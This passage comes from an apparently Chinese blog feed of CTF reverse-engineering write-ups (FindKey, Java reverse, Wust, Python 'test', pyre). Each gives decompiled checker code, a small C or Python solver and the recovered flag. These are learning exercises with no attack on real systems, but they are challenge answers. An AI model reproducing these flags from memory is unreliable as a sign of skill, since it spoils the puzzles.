a[29]&#x3D;&#123;0x48,0x5D,0x8D,0x24,0x84,0x27,0x99,0x9F,0x54,0x18,0x1E,</span><br><span class="line">0x69,0x7E,0x33,0x15,0x72,0x8D,0x33,0x24,0x63,0x21,0x54,0x0C,0x78,</span><br><span class="line">0x78,0x78,0x78,0x78,0x1B&#125;;</span><br><span class="line">char b[]&#x3D;&quot;lk2j9Gh&#125;AgfY4ds-a6QW1#k5ER_T[cvLbV7nOm3ZeX&#123;CMt8SZo]U&quot;;</span><br><span class="line">int flag[29];</span><br><span class="line">    for(i&#x3D;0;i&lt;29;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    flag[i]&#x3D;b[(a[i]&#x2F;3-2)];</span><br><span class="line">    if(flag[i]&lt;0)</span><br><span class="line">        flag[i]+&#x3D;128;</span><br><span class="line">    printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>kctf{YoU_hAVe-GOt-fLg_233333}</p></blockquote><h1 id="FindKey"><a href="#FindKey" class="headerlink" title="FindKey"></a>FindKey</h1><p><a href="https://pan.baidu.com/s/1p4533RDCl_ba51tAAZGe0g">附件链接</a> 提取码：0000<br>这是一个pyc文件，将后缀改为pyc即可反编译。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">lookup &#x3D; [196,153, 149,206, 17,221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, </span><br><span class="line">21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, </span><br><span class="line">165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, </span><br><span class="line">51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, </span><br><span class="line">231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, </span><br><span class="line">27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, </span><br><span class="line">145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, </span><br><span class="line">204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, </span><br><span class="line">205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, </span><br><span class="line">183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, </span><br><span class="line">24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, </span><br><span class="line">11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, </span><br><span class="line">125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, </span><br><span class="line">142, 139]</span><br><span class="line">pwda &#x3D; [188,155,11,58,251,208,204,202,150,120,206,237,114,92,126,6,42]</span><br><span class="line">pwdb &#x3D; [53,222,230,35,67,248,226,216,17,209,32,2,181,200,171,60,108]</span><br><span class="line">flag &#x3D; raw_input(&#39;Input your Key:&#39;).strip()</span><br><span class="line">if len(flag) !&#x3D; 17:</span><br><span class="line">    print &#39;Wrong Key!!&#39;</span><br><span class="line">    sys.exit(1)</span><br><span class="line">flag &#x3D; flag[::-1]</span><br><span class="line">for i in range(0, len(flag)):</span><br><span class="line">    if ord(flag[i]) + pwda[i] &amp; 255 !&#x3D; lookup[i + pwdb[i]]:</span><br><span class="line">        print &#39;Wrong Key!!&#39;</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">print &#39;Congratulations!!&#39;</span><br></pre></td></tr></table></figure><p>这里就是计算+倒序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int a[]&#x3D;&#123;196,153, 149,206, 17,221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, </span><br><span class="line">    21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, </span><br><span class="line">    165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, </span><br><span class="line">    51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, </span><br><span class="line">    231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, </span><br><span class="line">    27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, </span><br><span class="line">    145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, </span><br><span class="line">    204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, </span><br><span class="line">    205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, </span><br><span class="line">    183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, </span><br><span class="line">    24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, </span><br><span class="line">    11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, </span><br><span class="line">    125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, </span><br><span class="line">    142, 139&#125;;</span><br><span class="line">    int b[]&#x3D;&#123;188,155,11,58,251,208,204,202,150,120,206,237,114,92,126,6,42&#125;;</span><br><span class="line">    int c[]&#x3D;&#123;53,222,230,35,67,248,226,216,17,209,32,2,181,200,171,60,108&#125;;</span><br><span class="line">    char flag[17];</span><br><span class="line">    for(i&#x3D;0;i&lt;17;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    flag[i]&#x3D;a[i + c[i]]-b[i] &amp; 255;</span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;16;i&gt;&#x3D;0;i--)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面这个是python的，比用C语言写简单多了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lookup &#x3D; [196,153, 149,206, 17,221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, </span><br><span class="line">21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, </span><br><span class="line">165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, </span><br><span class="line">51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, </span><br><span class="line">231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, </span><br><span class="line">27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, </span><br><span class="line">145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, </span><br><span class="line">204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, </span><br><span class="line">205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, </span><br><span class="line">183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, </span><br><span class="line">24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, </span><br><span class="line">11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, </span><br><span class="line">125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, </span><br><span class="line">142, 139]</span><br><span class="line">pwda &#x3D; [188,155,11,58,251,208,204,202,150,120,206,237,114,92,126,6,42]</span><br><span class="line">pwdb &#x3D; [53,222,230,35,67,248,226,216,17,209,32,2,181,200,171,60,108]</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(0,17):</span><br><span class="line">    flag+&#x3D;chr(lookup[i + pwdb[i]]-pwda[i] &amp; 255)</span><br><span class="line">flag&#x3D;flag[::-1]</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure><blockquote><p>PCTF{PyC_Cr4ck3r}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java逆向</title>
      <link href="2021/03/03/java%E9%80%86%E5%90%91/"/>
      <url>2021/03/03/java%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86">题目链接</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class Reverse &#123;</span><br><span class="line"></span><br><span class="line">   public static void main(String[] args) &#123;</span><br><span class="line">      Scanner s &#x3D; new Scanner(System.in);</span><br><span class="line">      System.out.println(&quot;Please input the flag 锛�&quot;);</span><br><span class="line">      String str &#x3D; s.next();</span><br><span class="line">      System.out.println(&quot;Your input is 锛�&quot;);</span><br><span class="line">      System.out.println(str);</span><br><span class="line">      char[] stringArr &#x3D; str.toCharArray();</span><br><span class="line">      Encrypt(stringArr);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public static void Encrypt(char[] arr) &#123;</span><br><span class="line">      ArrayList Resultlist &#x3D; new ArrayList();</span><br><span class="line"></span><br><span class="line">      for(int KEY &#x3D; 0; KEY &lt; arr.length; ++KEY) &#123;</span><br><span class="line">         int KEYList &#x3D; arr[KEY] + 64 ^ 32;</span><br><span class="line">         Resultlist.add(Integer.valueOf(KEYList));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      int[] var5 &#x3D; new int[]&#123;180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, </span><br><span class="line">         134, 140, 129, 135, 191, 65&#125;;</span><br><span class="line">      ArrayList var6 &#x3D; new ArrayList();</span><br><span class="line"></span><br><span class="line">      for(int j &#x3D; 0; j &lt; var5.length; ++j) &#123;</span><br><span class="line">         var6.add(Integer.valueOf(var5[j]));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.println(&quot;Result:&quot;);</span><br><span class="line">      if(Resultlist.equals(var6)) &#123;</span><br><span class="line">         System.out.println(&quot;Congratulations锛�&quot;);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         System.err.println(&quot;Error锛�&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很清晰的逻辑，直接写脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int a[18]&#x3D;&#123;180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, </span><br><span class="line">      135, 191, 65&#125;;</span><br><span class="line">    for(i&#x3D;0;i&lt;18;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    a[i]&#x3D;a[i]-64 ^ 32;</span><br><span class="line">printf(&quot;%c&quot;,a[i]); </span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{This_is_the_flag_!}</p></blockquote><h1 id="Wust"><a href="#Wust" class="headerlink" title="Wust"></a>Wust</h1><p><a href="https://pan.baidu.com/s/11OVxyzhLx9z0A1pMTdYLxw">附件链接</a> 提取码：0000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Wust &#123;</span><br><span class="line"></span><br><span class="line">   public static void main(String[] args) &#123;</span><br><span class="line">      System.out.println(&quot;WUSTCTF2021 Freshman competition&quot;);</span><br><span class="line">      System.out.println(&quot;Input your flag:&quot;);</span><br><span class="line">      BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(System.in));</span><br><span class="line">      String str &#x3D; null;</span><br><span class="line">      int[] flag &#x3D; new int[]&#123;60, 23, 23, 41, 110, 66, 44, 17, 126, 68, 43, 26, 113, 71, 10&#125;;</span><br><span class="line"></span><br><span class="line">      try &#123;</span><br><span class="line">         str &#x3D; br.readLine();</span><br><span class="line">      &#125; catch (Exception var10) &#123;</span><br><span class="line">         System.out.println(&quot;ERROR: Undefined Exception.&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if(str.isEmpty()) &#123;</span><br><span class="line">         System.out.println(&quot;Nothing received.&quot;);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         if(str.length() !&#x3D; 22) &#123;</span><br><span class="line">            System.out.println(&quot;len Wrong!&quot;);</span><br><span class="line">            return;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         String head &#x3D; str.substring(0, 5);</span><br><span class="line">         if(!head.equals(&quot;flag&#123;&quot;)) &#123;</span><br><span class="line">            System.out.println(&quot;head Wrong!&quot;);</span><br><span class="line">            return;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         String m &#x3D; str.substring(5, str.length() - 1);</span><br><span class="line"></span><br><span class="line">         for(int i &#x3D; 0; i &lt; m.length() - 1; ++i) &#123;</span><br><span class="line">            char a &#x3D; m.charAt(i);</span><br><span class="line">            char b &#x3D; m.charAt(i + 1);</span><br><span class="line">            int c &#x3D; a ^ b;</span><br><span class="line">            if(c !&#x3D; flag[i]) &#123;</span><br><span class="line">               System.out.println(&quot;Wrong!&quot;);</span><br><span class="line">               return;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         System.out.println(&quot;Congratulations!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是输入flag，flag[2]=flag[1]^60,flag[3]=glag[2]^23,以此类推。<br>众所周知，大部分flag都是有意义的一串字符，这里我采用了穷举。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int i,j;</span><br><span class="line">int s[16];</span><br><span class="line">int f[15]&#x3D;&#123;60, 23, 23, 41, 110, 66, 44, 17, 126, 68, 43, 26, 113, 71, 10&#125;;</span><br><span class="line">for(i&#x3D;32;i&lt;127;i++)</span><br><span class="line">&#123;</span><br><span class="line">s[0]&#x3D;i;</span><br><span class="line">for(j&#x3D;0;j&lt;15;j++)</span><br><span class="line">&#123;</span><br><span class="line">s[j+1]&#x3D;f[j]^s[j];</span><br><span class="line">&#125;</span><br><span class="line">for(j&#x3D;0;j&lt;16;j++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,s[j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Jvav_1s_N0t_E4sy}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python逆向</title>
      <link href="2021/03/03/python%E9%80%86%E5%90%91/"/>
      <url>2021/03/03/python%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1DGgkAlcAH1QP1LROT60Ipg">附件链接</a> 提取码：0000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from libnum import *</span><br><span class="line">ans &#x3D; 0x6675FA7F228DBCEB6A2DC223A37FC64FE67E61L</span><br><span class="line">flag &#x3D; s2n(input(&#39;Input your flag: &#39;))</span><br><span class="line">flag ^&#x3D; flag &gt;&gt; 10</span><br><span class="line">if flag &#x3D;&#x3D; ans:</span><br><span class="line">    print(&#39;You are right!&#39;)</span><br><span class="line">else:</span><br><span class="line">    print(&#39;Try again!&#39;)</span><br></pre></td></tr></table></figure><p>flag的前十位与ans的前十位相同，flag的11-20位是flag1-10位与ans的11-20位异或的结果，以下为脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int ans[151]&#x3D;&#123;1,1,0,0,1,1,0,0,1,1,1,0,1,0,1,1,1,1,1,1,0,1,0,0,1,1,1,1,1,1,1,0,0,1,0,0,0,</span><br><span class="line">1,0,1,0,0,0,1,1,0,1,1,0,1,1,1,1,0,</span><br><span class="line">0,1,1,1,0,1,0,1,1,0,1,1,0,1,0,1,0,0,0,1,0,1,1,0,1,1,1,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,0,1,</span><br><span class="line">0,0,0,1,1,0,1,1,1,1,1,1,1,1,1,0,0,</span><br><span class="line">0,1,1,0,0,1,0,0,1,1,1,1,1,1,1,0,0,1,1,0,0,1,1,1,1,1,1,0,0,1,1,0,0,0,0,1&#125;;</span><br><span class="line">int flag[151];</span><br><span class="line">int i,k,j&#x3D;10;</span><br><span class="line">for(i&#x3D;0;i&lt;10;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]&#x3D;ans[i];</span><br><span class="line">printf(&quot;%d&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">for(k&#x3D;0;k&lt;14;k++)</span><br><span class="line">&#123;</span><br><span class="line">for(i&#x3D;j;i&lt;j+10;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]&#x3D;ans[i]^flag[i-10];</span><br><span class="line">printf(&quot;%d&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">j&#x3D;j+10;</span><br><span class="line">&#125;</span><br><span class="line">flag[151]&#x3D;flag[141]^ans[151];</span><br><span class="line">printf(&quot;%d&quot;,flag[151]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为2进制，转16进制再转字符串。</p><blockquote><p>flag{Sh1ft_4nd_X0r}</p></blockquote><h1 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h1><p><a href="https://buuoj.cn/challenges#[GWCTF%202019]pyre">题目链接</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">print &#39;Welcome to Re World!&#39;</span><br><span class="line">print &#39;Your input1 is your flag~&#39;</span><br><span class="line">l &#x3D; len(input1)</span><br><span class="line">for i in range(l):</span><br><span class="line">    num &#x3D; ((input1[i] + i) % 128 + 128) % 128</span><br><span class="line">    code +&#x3D; num</span><br><span class="line"></span><br><span class="line">for i in range(l - 1):</span><br><span class="line">    code[i] &#x3D; code[i] ^ code[i + 1]</span><br><span class="line"></span><br><span class="line">print code</span><br><span class="line">code &#x3D; [</span><br><span class="line">    &#39;\x1f&#39;,</span><br><span class="line">    &#39;\x12&#39;,</span><br><span class="line">    &#39;\x1d&#39;,</span><br><span class="line">    &#39;(&#39;,</span><br><span class="line">    &#39;0&#39;,</span><br><span class="line">    &#39;4&#39;,</span><br><span class="line">    &#39;\x01&#39;,</span><br><span class="line">    &#39;\x06&#39;,</span><br><span class="line">    &#39;\x14&#39;,</span><br><span class="line">    &#39;4&#39;,</span><br><span class="line">    &#39;,&#39;,</span><br><span class="line">    &#39;\x1b&#39;,</span><br><span class="line">    &#39;U&#39;,</span><br><span class="line">    &#39;?&#39;,</span><br><span class="line">    &#39;o&#39;,</span><br><span class="line">    &#39;6&#39;,</span><br><span class="line">    &#39;*&#39;,</span><br><span class="line">    &#39;:&#39;,</span><br><span class="line">    &#39;\x01&#39;,</span><br><span class="line">    &#39;D&#39;,</span><br><span class="line">    &#39;;&#39;,</span><br><span class="line">    &#39;%&#39;,</span><br><span class="line">    &#39;\x13&#39;]</span><br></pre></td></tr></table></figure><p>第五行其实就是num=input1[i]+i,超过127，就减去128.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i,j;</span><br><span class="line">    int code[23]&#x3D;&#123;0x1f,0x12,0x1d,&#39;(&#39;,&#39;0&#39;,&#39;4&#39;,0x01,0x06,0x14,&#39;4&#39;,&#39;,&#39;,0x1b,</span><br><span class="line">    &#39;U&#39;,&#39;?&#39;,&#39;o&#39;,&#39;6&#39;,&#39;*&#39;,&#39;:&#39;,0x01,&#39;D&#39;,&#39;;&#39;,&#39;%&#39;,0x13&#125;;</span><br><span class="line">    for(i&#x3D;21;i&gt;&#x3D;0;i--)</span><br><span class="line">    &#123;</span><br><span class="line">    code[i]&#x3D;code[i]^code[i + 1];</span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;0;i&lt;23;i++)</span><br><span class="line">&#123;</span><br><span class="line">code[i]-&#x3D;i;</span><br><span class="line">if(code[i]&lt;0)</span><br><span class="line">    code[i]+&#x3D;128;</span><br><span class="line">printf(&quot;%c&quot;,code[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Just_Re_1s_Ha66y!}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
